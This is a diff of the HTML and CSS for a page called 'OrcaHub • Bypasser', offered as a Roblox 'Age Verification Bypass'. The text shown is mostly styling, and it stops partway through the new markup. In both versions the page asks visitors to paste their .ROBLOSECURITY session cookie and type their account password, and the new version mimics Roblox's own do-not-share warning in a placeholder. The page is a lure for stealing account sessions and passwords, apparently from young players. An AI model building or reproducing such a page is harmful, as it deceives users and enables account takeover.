@@ -1,1187 +1,900 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>OrcaHub • Bypasser</title>
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-<style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-
-  body {
-    min-height: 100vh;
-    overflow-x: hidden;
-    font-family: 'Segoe UI', Tahoma, sans-serif;
-    background: #04080f;
-    background-image:
-      radial-gradient(circle at 25% 15%, rgba(0,120,180,0.25), transparent 45%),
-      radial-gradient(circle at 75% 85%, rgba(0,60,90,0.35), transparent 45%);
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    padding: 40px 16px;
-    position: relative;
-  }
-
-  .brand {
-    color: rgba(255,255,255,0.4);
-    font-size: 12px;
-    letter-spacing: 4px;
-    text-transform: uppercase;
-    margin-bottom: 20px;
-    animation: fadeIn 0.8s ease;
-  }
-
-  @keyframes fadeIn {
-    from { opacity: 0; }
-    to { opacity: 1; }
-  }
-
-  .frame {
-    position: relative;
-    width: 100%;
-    max-width: 400px;
-    height: 300px;
-    background: linear-gradient(180deg, #061826 0%, #03202f 55%, #011a28 100%);
-    border-radius: 20px;
-    border: 1px solid rgba(79, 209, 255, 0.35);
-    box-shadow: 0 0 40px rgba(0, 180, 255, 0.18), inset 0 0 60px rgba(0, 100, 150, 0.15);
-    overflow: hidden;
-  }
-
-  .word-layer {
-    position: absolute;
-    inset: 0;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    z-index: 1;
-    pointer-events: none;
-  }
-
-  .word {
-    font-size: 34px;
-    font-weight: 800;
-    letter-spacing: 1px;
-    display: flex;
-  }
-
-  .word .letter {
-    display: inline-block;
-    opacity: 0;
-    color: rgba(255,255,255,0.92);
-    text-shadow: 0 0 18px rgba(79, 209, 255, 0.55);
-    transform: translateY(14px) scale(0.7);
-    animation: letterIn 0.5s cubic-bezier(0.34,1.56,0.64,1) forwards;
-  }
-
-  @keyframes letterIn {
-    to { opacity: 1; transform: translateY(0) scale(1); }
-  }
-
-  .scene {
-    position: absolute;
-    inset: 0;
-    z-index: 2;
-  }
-
-  .scene canvas {
-    width: 100% !important;
-    height: 100% !important;
-    display: block;
-  }
-
-  .water-line {
-    position: absolute;
-    left: 0; right: 0;
-    bottom: 38%;
-    height: 1px;
-    background: linear-gradient(90deg, transparent, rgba(79,209,255,0.4), transparent);
-    z-index: 3;
-    pointer-events: none;
-  }
-
-  .loading-panel {
-    margin-top: 28px;
-    width: 100%;
-    max-width: 340px;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    gap: 12px;
-    opacity: 0;
-    transform: translateY(10px);
-    pointer-events: none;
-    transition: opacity 0.5s ease, transform 0.5s ease;
-  }
-
-  .loading-panel.show {
-    opacity: 1;
-    transform: translateY(0);
-  }
-
-  .loading-row {
-    display: flex;
-    align-items: center;
-    gap: 10px;
-  }
-
-  .spinner {
-    width: 20px;
-    height: 20px;
-    border-radius: 50%;
-    border: 3px solid rgba(79, 209, 255, 0.15);
-    border-top-color: #4fd1ff;
-    animation: spin 0.8s linear infinite;
-    flex-shrink: 0;
-  }
-
-  @keyframes spin {
-    to { transform: rotate(360deg); }
-  }
-
-  .loading-text {
-    color: #cdefff;
-    font-size: 14px;
-    font-weight: 600;
-    letter-spacing: 2px;
-    text-transform: uppercase;
-  }
-
-  .loading-text .dots span {
-    opacity: 0;
-    animation: dotBlink 1.2s infinite;
-  }
-  .loading-text .dots span:nth-child(1) { animation-delay: 0s; }
-  .loading-text .dots span:nth-child(2) { animation-delay: 0.2s; }
-  .loading-text .dots span:nth-child(3) { animation-delay: 0.4s; }
-
-  @keyframes dotBlink {
-    0%, 20% { opacity: 0; }
-    50% { opacity: 1; }
-    100% { opacity: 0; }
-  }
-
-  .progress-track {
-    width: 100%;
-    height: 6px;
-    border-radius: 4px;
-    background: rgba(255,255,255,0.07);
-    overflow: hidden;
-  }
-
-  .progress-fill {
-    height: 100%;
-    width: 0%;
-    border-radius: 4px;
-    background: linear-gradient(90deg, #00c2ff, #4fd1ff, #7dffea);
-    box-shadow: 0 0 10px rgba(79, 209, 255, 0.6);
-    transition: width 3s linear;
-  }
-
-  .login-btn {
-    margin-top: 28px;
-    display: flex;
-    align-items: center;
-    gap: 10px;
-    padding: 15px 38px;
-    border: none;
-    border-radius: 50px;
-    background: linear-gradient(135deg, #00c2ff, #4fd1ff, #00ffc8);
-    color: #04141f;
-    font-size: 16px;
-    font-weight: 800;
-    letter-spacing: 1px;
-    cursor: pointer;
-    box-shadow: 0 0 0 rgba(79, 209, 255, 0);
-    transform: scale(0);
-    opacity: 0;
-    transition: transform 0.2s ease, box-shadow 0.3s ease;
-  }
-
-  .login-btn.show {
-    animation: popIn 0.6s cubic-bezier(0.34,1.56,0.64,1) forwards;
-  }
-
-  @keyframes popIn {
-    0% { transform: scale(0); opacity: 0; }
-    70% { transform: scale(1.08); opacity: 1; }
-    100% { transform: scale(1); opacity: 1; box-shadow: 0 0 25px rgba(79, 209, 255, 0.5); }
-  }
-
-  .login-btn:hover {
-    transform: scale(1.05);
-    box-shadow: 0 0 35px rgba(79, 209, 255, 0.75);
-  }
-
-  .login-btn:active {
-    transform: scale(0.97);
-  }
-
-  .login-btn svg {
-    width: 18px;
-    height: 18px;
-  }
-
-  .footer {
-    margin-top: 30px;
-    font-size: 11px;
-    color: rgba(255,255,255,0.3);
-    letter-spacing: 2px;
-    text-transform: uppercase;
-  }
-
-  /* ===== BYPASSER OVERLAY ===== */
-  .bypasser-overlay {
-    display: none;
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: rgba(4, 8, 15, 0.92);
-    backdrop-filter: blur(20px);
-    -webkit-backdrop-filter: blur(20px);
-    z-index: 100;
-    justify-content: center;
-    align-items: center;
-    padding: 20px;
-  }
-
-  .bypasser-overlay.open {
-    display: flex;
-    animation: fadeIn 0.5s ease;
-  }
-
-  .bypasser-card {
-    width: 100%;
-    max-width: 480px;
-    background: rgba(16, 16, 30, 0.9);
-    border-radius: 40px;
-    border: 1px solid rgba(255, 255, 255, 0.05);
-    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
-    padding: 28px 26px;
-    animation: slideUp 0.6s ease;
-  }
-
-  @keyframes slideUp {
-    from { opacity: 0; transform: translateY(30px); }
-    to { opacity: 1; transform: translateY(0); }
-  }
-
-  .bypasser-header {
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    margin-bottom: 16px;
-  }
-
-  .bypasser-header h3 {
-    font-size: 16px;
-    font-weight: 700;
-    color: #fff;
-    letter-spacing: 1px;
-  }
-
-  .bypasser-header span {
-    font-size: 11px;
-    color: #4ecdc4;
-    font-weight: 600;
-  }
-
-  .bypasser-input-group {
-    display: flex;
-    flex-direction: column;
-    gap: 10px;
-    margin-bottom: 14px;
-  }
-
-  .bypasser-input-group input {
-    width: 100%;
-    padding: 13px 18px;
-    background: rgba(10, 10, 20, 0.6);
-    border: 1px solid rgba(255, 255, 255, 0.06);
-    border-radius: 30px;
-    color: #f0f0ff;
-    font-size: 13px;
-    outline: none;
-    transition: 0.4s;
-  }
-
-  .bypasser-input-group input:focus {
-    border-color: #a29bfe;
-    box-shadow: 0 0 0 4px rgba(162, 155, 254, 0.08);
-  }
-
-  .bypasser-input-group input::placeholder {
-    color: #3a3a52;
-  }
-
-  .bypasser-input-group input.error {
-    border-color: #ff6b6b;
-    box-shadow: 0 0 0 4px rgba(255, 107, 107, 0.1);
-  }
-
-  .bypasser-input-group input.success {
-    border-color: #4ecdc4;
-    box-shadow: 0 0 0 4px rgba(78, 205, 196, 0.1);
-  }
-
-  .profile-preview {
-    background: linear-gradient(135deg, rgba(30, 20, 48, 0.7), rgba(20, 20, 36, 0.8));
-    border-radius: 32px;
-    padding: 14px 18px;
-    margin-bottom: 14px;
-    border: 1px solid rgba(255, 255, 255, 0.03);
-    display: none;
-    align-items: center;
-    gap: 14px;
-    backdrop-filter: blur(8px);
-    transition: all 0.4s ease;
-  }
-
-  .profile-preview.show {
-    display: flex;
-    animation: fadeInScale 0.5s ease;
-  }
-
-  @keyframes fadeInScale {
-    from { opacity: 0; transform: scale(0.92); }
-    to { opacity: 1; transform: scale(1); }
-  }
-
-  .profile-preview img {
-    width: 50px;
-    height: 50px;
-    border-radius: 50%;
-    border: 2px solid rgba(162, 155, 254, 0.3);
-    box-shadow: 0 0 30px rgba(162, 155, 254, 0.15);
-    object-fit: cover;
-    background: #1a1a2e;
-  }
-
-  .profile-info {
-    flex: 1;
-  }
-
-  .profile-name {
-    font-size: 0.95rem;
-    font-weight: 700;
-    color: #fff;
-  }
-
-  .profile-id {
-    color: #8888aa;
-    font-size: 0.65rem;
-    margin-top: 1px;
-  }
-
-  .profile-stats {
-    color: #666688;
-    font-size: 0.6rem;
-    margin-top: 1px;
-  }
-
-  .badge-verified {
-    display: inline-block;
-    background: rgba(78, 205, 196, 0.15);
-    color: #4ecdc4;
-    padding: 1px 10px;
-    border-radius: 20px;
-    font-size: 0.55rem;
-    font-weight: 600;
-    margin-top: 2px;
-    border: 1px solid rgba(78, 205, 196, 0.1);
-  }
-
-  .bypasser-actions {
-    display: flex;
-    gap: 10px;
-    margin-top: 4px;
-  }
-
-  .bypasser-actions .btn-bypass {
-    flex: 2;
-    padding: 13px;
-    background: linear-gradient(135deg, #a29bfe, #ff6b6b);
-    border: none;
-    border-radius: 30px;
-    font-weight: 700;
-    font-size: 13px;
-    color: white;
-    cursor: pointer;
-    transition: 0.4s;
-    text-transform: uppercase;
-    letter-spacing: 1px;
-  }
-
-  .bypasser-actions .btn-bypass:hover {
-    transform: scale(1.02);
-    box-shadow: 0 8px 30px rgba(162, 155, 254, 0.3);
-  }
-
-  .bypasser-actions .btn-bypass:disabled {
-    opacity: 0.5;
-    cursor: not-allowed;
-    transform: none !important;
-  }
-
-  .bypasser-actions .btn-instagram {
-    flex: 1;
-    padding: 13px;
-    background: linear-gradient(135deg, #f58529, #dd2a7b);
-    border: none;
-    border-radius: 30px;
-    font-weight: 700;
-    font-size: 12px;
-    color: white;
-    cursor: pointer;
-    transition: 0.4s;
-    text-decoration: none;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 6px;
-    text-transform: uppercase;
-    letter-spacing: 0.5px;
-  }
-
-  .bypasser-actions .btn-instagram:hover {
-    transform: scale(1.02);
-    box-shadow: 0 8px 30px rgba(221, 42, 123, 0.3);
-  }
-
-  .bypasser-actions .btn-instagram svg {
-    width: 16px;
-    height: 16px;
-    fill: currentColor;
-  }
-
-  .bypasser-loader {
-    display: none;
-    text-align: center;
-    padding: 10px 0;
-  }
-
-  .bypasser-loader.show {
-    display: block;
-    animation: fadeIn 0.4s ease;
-  }
-
-  .bypasser-loader .spinner-small {
-    width: 40px;
-    height: 40px;
-    border: 3px solid rgba(162, 155, 254, 0.08);
-    border-top-color: #a29bfe;
-    border-right-color: #ff6b6b;
-    border-radius: 50%;
-    animation: spin 0.8s ease infinite;
-    margin: 0 auto 10px;
-  }
-
-  .bypasser-loader .loader-text {
-    color: #8888aa;
-    font-size: 12px;
-    font-weight: 300;
-  }
-
-  .bypasser-loader .loader-text .time {
-    color: #ff6b6b;
-    font-weight: 700;
-  }
-
-  .bypasser-result {
-    display: none;
-    background: rgba(78, 205, 196, 0.06);
-    border: 1px solid rgba(78, 205, 196, 0.12);
-    color: #4ecdc4;
-    padding: 12px 16px;
-    border-radius: 24px;
-    text-align: center;
-    font-size: 13px;
-    font-weight: 600;
-    margin-top: 12px;
-    animation: fadeIn 0.4s ease;
-  }
-
-  .bypasser-result.show {
-    display: block;
-  }
-
-  .bypasser-result .big {
-    font-size: 2rem;
-    display: block;
-    margin-bottom: 4px;
-  }
-
-  .bypasser-error {
-    display: none;
-    background: rgba(255, 107, 107, 0.08);
-    border: 1px solid rgba(255, 107, 107, 0.15);
-    color: #ff6b6b;
-    padding: 10px 14px;
-    border-radius: 20px;
-    font-size: 12px;
-    font-weight: 500;
-    text-align: center;
-    margin-top: 10px;
-    animation: fadeIn 0.4s ease;
-  }
-
-  .bypasser-error.show {
-    display: block;
-  }
-
-  .close-bypasser {
-    position: absolute;
-    top: 20px;
-    right: 30px;
-    color: rgba(255,255,255,0.3);
-    font-size: 28px;
-    cursor: pointer;
-    transition: 0.3s;
-    background: none;
-    border: none;
-  }
-
-  .close-bypasser:hover {
-    color: #fff;
-    transform: rotate(90deg);
-  }
-
-  @media (max-width: 480px) {
-    .bypasser-card { padding: 20px 16px; }
-    .bypasser-actions { flex-direction: column; gap: 8px; }
-    .profile-preview { flex-direction: column; text-align: center; }
-    .profile-preview img { width: 60px; height: 60px; }
-  }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>OrcaHub • Bypasser</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', 'Helvetica Neue', system-ui, sans-serif;
+        }
+
+        body {
+            height: 100vh;
+            overflow: hidden;
+            background: linear-gradient(-45deg, #0a0a14, #12121f, #1a0a2e, #0f0f1a);
+            background-size: 400% 400%;
+            animation: gradientShift 18s ease infinite;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        /* ===== BUBBLES ===== */
+        .bubbles {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            overflow: hidden;
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        .bubble {
+            position: absolute;
+            bottom: -100px;
+            border-radius: 50%;
+            opacity: 0.15;
+            animation: rise linear infinite;
+        }
+
+        .bubble:nth-child(1) { width: 80px; height: 80px; left: 10%; animation-duration: 12s; background: radial-gradient(circle, #a29bfe, transparent); }
+        .bubble:nth-child(2) { width: 120px; height: 120px; left: 25%; animation-duration: 16s; animation-delay: 2s; background: radial-gradient(circle, #ff6b6b, transparent); }
+        .bubble:nth-child(3) { width: 60px; height: 60px; left: 45%; animation-duration: 10s; animation-delay: 4s; background: radial-gradient(circle, #4ecdc4, transparent); }
+        .bubble:nth-child(4) { width: 100px; height: 100px; left: 65%; animation-duration: 14s; animation-delay: 1s; background: radial-gradient(circle, #ffe66d, transparent); }
+        .bubble:nth-child(5) { width: 150px; height: 150px; left: 80%; animation-duration: 18s; animation-delay: 3s; background: radial-gradient(circle, #a29bfe, transparent); }
+        .bubble:nth-child(6) { width: 70px; height: 70px; left: 5%; animation-duration: 13s; animation-delay: 5s; background: radial-gradient(circle, #ff6b6b, transparent); }
+        .bubble:nth-child(7) { width: 90px; height: 90px; left: 55%; animation-duration: 15s; animation-delay: 2.5s; background: radial-gradient(circle, #4ecdc4, transparent); }
+        .bubble:nth-child(8) { width: 110px; height: 110px; left: 35%; animation-duration: 11s; animation-delay: 6s; background: radial-gradient(circle, #ffe66d, transparent); }
+
+        @keyframes rise {
+            0% { transform: translateY(0) scale(0.8); opacity: 0.1; }
+            50% { opacity: 0.25; }
+            100% { transform: translateY(-120vh) scale(1.2); opacity: 0; }
+        }
+
+        .shape {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(80px);
+            opacity: 0.15;
+            animation: float 14s ease-in-out infinite;
+            pointer-events: none;
+        }
+
+        .shape:nth-child(1) {
+            width: 200px;
+            height: 200px;
+            background: radial-gradient(circle, #ff6b6b, transparent 70%);
+            top: 10%;
+            left: 5%;
+            animation-duration: 12s;
+        }
+        .shape:nth-child(2) {
+            width: 280px;
+            height: 280px;
+            background: radial-gradient(circle, #a29bfe, transparent 70%);
+            bottom: 10%;
+            right: 5%;
+            animation-duration: 16s;
+            animation-delay: -4s;
+        }
+        .shape:nth-child(3) {
+            width: 150px;
+            height: 150px;
+            background: radial-gradient(circle, #4ecdc4, transparent 70%);
+            top: 60%;
+            left: 15%;
+            animation-duration: 10s;
+            animation-delay: -6s;
+        }
+        .shape:nth-child(4) {
+            width: 220px;
+            height: 220px;
+            background: radial-gradient(circle, #ffe66d, transparent 70%);
+            top: 20%;
+            right: 20%;
+            animation-duration: 15s;
+            animation-delay: -8s;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            25% { transform: translate(40px, -50px) scale(1.1); }
+            50% { transform: translate(-30px, 30px) scale(0.95); }
+            75% { transform: translate(-50px, -20px) scale(1.05); }
+        }
+
+        /* ===== MAIN CARD ===== */
+        .glass-card {
+            position: relative;
+            z-index: 10;
+            width: 94%;
+            max-width: 480px;
+            background: rgba(16, 16, 30, 0.78);
+            backdrop-filter: blur(30px);
+            -webkit-backdrop-filter: blur(30px);
+            border-radius: 48px;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.7), inset 0 1px 0 rgba(255, 255, 255, 0.04), 0 0 80px rgba(162, 155, 254, 0.06);
+            padding: 36px 28px 32px;
+            transition: all 0.4s ease;
+            animation: fadeIn 0.8s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px) scale(0.97); }
+            to { opacity: 1; transform: translateY(0) scale(1); }
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 28px;
+        }
+
+        .logo-icon {
+            font-size: 3.2rem;
+            display: inline-block;
+            background: linear-gradient(135deg, #ff6b6b, #a29bfe, #4ecdc4);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            filter: drop-shadow(0 0 30px rgba(162, 155, 254, 0.2));
+            animation: floatIcon 3.5s ease-in-out infinite;
+        }
+
+        @keyframes floatIcon {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-8px); }
+        }
+
+        h1 {
+            font-size: 1.7rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #a29bfe, #ff6b6b);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            letter-spacing: -0.5px;
+            margin-top: 4px;
+        }
+
+        .sub {
+            color: #8888aa;
+            font-size: 0.7rem;
+            letter-spacing: 4px;
+            text-transform: uppercase;
+            margin-top: 6px;
+            font-weight: 300;
+            border-top: 1px solid rgba(255, 255, 255, 0.04);
+            padding-top: 10px;
+        }
+
+        /* ===== FORM ===== */
+        label {
+            display: block;
+            font-weight: 700;
+            margin-bottom: 8px;
+            color: #c0c0dd;
+            font-size: 0.75rem;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+
+        input {
+            width: 100%;
+            padding: 15px 18px;
+            background: rgba(10, 10, 20, 0.6);
+            border: 1.5px solid rgba(255, 255, 255, 0.05);
+            border-radius: 30px;
+            color: #f0f0ff;
+            font-size: 0.95rem;
+            outline: none;
+            transition: all 0.4s ease;
+            margin-bottom: 18px;
+        }
+
+        input:focus {
+            border-color: #a29bfe;
+            box-shadow: 0 0 0 4px rgba(162, 155, 254, 0.1);
+            background: rgba(20, 20, 36, 0.7);
+        }
+
+        input::placeholder {
+            color: #3a3a52;
+        }
+
+        input.error {
+            border-color: #ff6b6b;
+            box-shadow: 0 0 0 4px rgba(255, 107, 107, 0.1);
+        }
+
+        input.success {
+            border-color: #4ecdc4;
+            box-shadow: 0 0 0 4px rgba(78, 205, 196, 0.1);
+        }
+
+        /* ===== PROFILE PREVIEW ===== */
+        .profile-preview {
+            background: linear-gradient(135deg, rgba(30, 20, 48, 0.7), rgba(20, 20, 36, 0.8));
+            border-radius: 32px;
+            padding: 16px 20px;
+            margin-bottom: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.03);
+            display: none;
+            align-items: center;
+            gap: 16px;
+            backdrop-filter: blur(8px);
+            transition: all 0.4s ease;
+        }
+
+        .profile-preview.show {
+            display: flex;
+            animation: fadeInScale 0.5s ease;
+        }
+
+        @keyframes fadeInScale {
+            from { opacity: 0; transform: scale(0.92); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        .profile-preview img {
+            width: 56px;
+            height: 56px;
+            border-radius: 50%;
+            border: 2px solid rgba(162, 155, 254, 0.3);
+            box-shadow: 0 0 30px rgba(162, 155, 254, 0.15);
+            object-fit: cover;
+            background: #1a1a2e;
+        }
+
+        .profile-info {
+            flex: 1;
+        }
+
+        .profile-name {
+            font-size: 1rem;
+            font-weight: 700;
+            color: #fff;
+        }
+
+        .profile-id {
+            color: #8888aa;
+            font-size: 0.7rem;
+            margin-top: 2px;
+        }
+
+        .profile-stats {
+            color: #666688;
+            font-size: 0.65rem;
+            margin-top: 2px;
+        }
+
+        .badge-verified {
+            display: inline-block;
+            background: rgba(78, 205, 196, 0.15);
+            color: #4ecdc4;
+            padding: 2px 12px;
+            border-radius: 20px;
+            font-size: 0.6rem;
+            font-weight: 600;
+            margin-top: 4px;
+            border: 1px solid rgba(78, 205, 196, 0.1);
+        }
+
+        /* ===== BUTTONS ===== */
+        .btn-primary {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #a29bfe, #ff6b6b);
+            border: none;
+            border-radius: 40px;
+            font-weight: 800;
+            font-size: 0.95rem;
+            color: white;
+            cursor: pointer;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-primary::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255, 255, 255, 0.08) 0%, transparent 70%);
+            opacity: 0;
+            transition: opacity 0.5s;
+        }
+
+        .btn-primary:hover::before {
+            opacity: 1;
+        }
+
+        .btn-primary:hover {
+            transform: scale(1.02);
+            box-shadow: 0 10px 40px rgba(162, 155, 254, 0.3);
+        }
+
+        .btn-primary:active {
+            transform: scale(0.96);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+
+        .btn-secondary {
+            width: 100%;
+            padding: 12px;
+            background: rgba(50, 50, 74, 0.25);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            border-radius: 40px;
+            font-weight: 600;
+            font-size: 0.8rem;
+            color: #8888aa;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 10px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .btn-secondary:hover {
+            background: rgba(60, 60, 84, 0.4);
+            color: #ccccee;
+        }
+
+        .btn-group {
+            display: flex;
+            gap: 10px;
+        }
+
+        .btn-group .btn-primary {
+            flex: 2;
+        }
+
+        .btn-group .btn-instagram {
+            flex: 1;
+            padding: 15px;
+            background: linear-gradient(135deg, #f58529, #dd2a7b);
+            border: none;
+            border-radius: 40px;
+            font-weight: 700;
+            font-size: 0.8rem;
+            color: white;
+            cursor: pointer;
+            transition: all 0.4s;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .btn-group .btn-instagram:hover {
+            transform: scale(1.02);
+            box-shadow: 0 8px 30px rgba(221, 42, 123, 0.3);
+        }
+
+        .btn-group .btn-instagram svg {
+            width: 16px;
+            height: 16px;
+            fill: currentColor;
+        }
+
+        /* ===== LOADER ===== */
+        .loader-container {
+            display: none;
+            text-align: center;
+            padding: 15px 0;
+        }
+
+        .loader-container.show {
+            display: block;
+            animation: fadeInScale 0.4s ease;
+        }
+
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 3.5px solid rgba(162, 155, 254, 0.08);
+            border-top-color: #a29bfe;
+            border-right-color: #ff6b6b;
+            border-bottom-color: #4ecdc4;
+            border-radius: 50%;
+            animation: spin 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275) infinite;
+            margin: 0 auto 14px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .loader-text {
+            color: #a0a0b8;
+            font-size: 0.85rem;
+            font-weight: 300;
+            letter-spacing: 0.5px;
+        }
+
+        .loader-text .time {
+            color: #ff6b6b;
+            font-weight: 700;
+            font-size: 1.1rem;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 2px;
+            margin: 12px auto 0;
+            overflow: hidden;
+        }
+
+        .progress-bar .fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #a29bfe, #ff6b6b, #4ecdc4);
+            border-radius: 2px;
+            transition: width 0.1s linear;
+        }
+
+        /* ===== RESULT ===== */
+        .result-message {
+            display: none;
+            background: rgba(78, 205, 196, 0.06);
+            border: 1px solid rgba(78, 205, 196, 0.12);
+            color: #4ecdc4;
+            padding: 14px;
+            border-radius: 28px;
+            text-align: center;
+            font-size: 0.9rem;
+            font-weight: 600;
+            margin-top: 12px;
+            animation: fadeInScale 0.4s ease;
+        }
+
+        .result-message.show {
+            display: block;
+        }
+
+        .result-message .big {
+            font-size: 2.5rem;
+            display: block;
+            margin-bottom: 4px;
+        }
+
+        .error-message {
+            display: none;
+            background: rgba(255, 107, 107, 0.08);
+            border: 1px solid rgba(255, 107, 107, 0.15);
+            color: #ff6b6b;
+            padding: 10px 14px;
+            border-radius: 24px;
+            font-size: 0.85rem;
+            font-weight: 500;
+            text-align: center;
+            margin-top: 10px;
+            animation: fadeInScale 0.4s ease;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        .footer {
+            text-align: center;
+            color: #3a3a52;
+            font-size: 0.55rem;
+            margin-top: 24px;
+            border-top: 1px solid rgba(255, 255, 255, 0.02);
+            padding-top: 16px;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+        }
+
+        @media (max-width: 480px) {
+            .glass-card { padding: 28px 18px 24px; border-radius: 36px; }
+            h1 { font-size: 1.4rem; }
+            .logo-icon { font-size: 2.6rem; }
+            .btn-group { flex-direction: column; gap: 8px; }
+            .profile-preview { flex-direction: column; text-align: center; }
+            .profile-preview img { width: 56px; height: 56px; }
+        }
+    </style>
 </head>
 <body>
 
-  <div class="brand">orcahub</div>
-
-  <div class="frame">
-    <div class="water-line"></div>
-    <div class="word-layer">
-      <div class="word" id="word"></div>
+    <!-- ===== BUBBLES ===== -->
+    <div class="bubbles">
+        <div class="bubble"></div>
+        <div class="bubble"></div>
+        <div class="bubble"></div>
+        <div class="bubble"></div>
+        <div class="bubble"></div>
+        <div class="bubble"></div>
+        <div class="bubble"></div>
+        <div class="bubble"></div>
     </div>
-    <div class="scene" id="scene"></div>
-  </div>
 
-  <div class="loading-panel" id="loadingPanel">
-    <div class="loading-row">
-      <div class="spinner"></div>
-      <div class="loading-text">
-        WAITING<span class="dots"><span>.</span><span>.</span><span>.</span></span>
-      </div>
-    </div>
-    <div class="progress-track">
-      <div class="progress-fill" id="progressFill"></div>
-    </div>
-  </div>
+    <div class="shape"></div>
+    <div class="shape"></div>
+    <div class="shape"></div>
+    <div class="shape"></div>
 
-  <button class="login-btn" id="loginBtn">
-    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-      <path d="M12 2C9.79 2 8 3.79 8 6V10H7C5.9 10 5 10.9 5 12V20C5 21.1 5.9 22 7 22H17C18.1 22 19 21.1 19 20V12C19 10.9 18.1 10 17 10H16V6C16 3.79 14.21 2 12 2ZM12 4C13.1 4 14 4.9 14 6V10H10V6C10 4.9 10.9 4 12 4ZM12 14C13.1 14 14 14.9 14 16C14 17.1 13.1 18 12 18C10.9 18 10 17.1 10 16C10 14.9 10.9 14 12 14Z" fill="#04141f"/>
-    </svg>
-    LOGIN
-  </button>
-
-  <div class="footer">orcahub</div>
-
-  <!-- ===== BYPASSER OVERLAY ===== -->
-  <div class="bypasser-overlay" id="bypasserOverlay">
-    <button class="close-bypasser" id="closeBypasser">✕</button>
-    <div class="bypasser-card">
-      <div class="bypasser-header">
-        <h3>🔓 Age Bypass</h3>
-        <span>OrcaHub • v3.0</span>
-      </div>
-
-      <div class="bypasser-input-group">
-        <input type="text" id="cookieInput" placeholder="🍪 .ROBLOSECURITY Cookie" autocomplete="off">
-        <input type="password" id="passwordInput" placeholder="🔑 Account Password" autocomplete="off">
-      </div>
-
-      <div id="profilePreview" class="profile-preview">
-        <img id="profileImg" src="" alt="avatar">
-        <div class="profile-info">
-          <div class="profile-name" id="profileName">@username</div>
-          <div class="profile-id" id="profileId">ID: --</div>
-          <div class="profile-stats" id="profileStats">📊 Followers: -- • Following: --</div>
-          <span class="badge-verified" id="profileBadge">✅ Verified</span>
+    <div class="glass-card" id="app">
+        <div class="header">
+            <div class="logo-icon">✦</div>
+            <h1>OrcaHub • Bypasser</h1>
+            <div class="sub">Age Verification Bypass</div>
         </div>
-      </div>
 
-      <div id="bypasserError" class="bypasser-error"></div>
+        <label>🍪 Enter .ROBLOSECURITY Cookie</label>
+        <input type="text" id="cookieInput" placeholder="_|WARNING:-DO-NOT-SHARE..." autocomplete="off">
 
-      <div id="bypasserLoader" class="bypasser-loader">
-        <div class="spinner-small"></div>
-        <div class="loader-text">
-          ⏳ Processing bypass...<br>
-          <span class="time" id="bypassTimer">60</span> seconds remaining
+        <label>🔑 Enter Account Password</label>
+        <input type="password" id="passwordInput" placeholder="••••••••" autocomplete="off">
+
+        <div id="profilePreview" class="profile-preview">
+            <img id="profileImg" src="" alt="avatar">
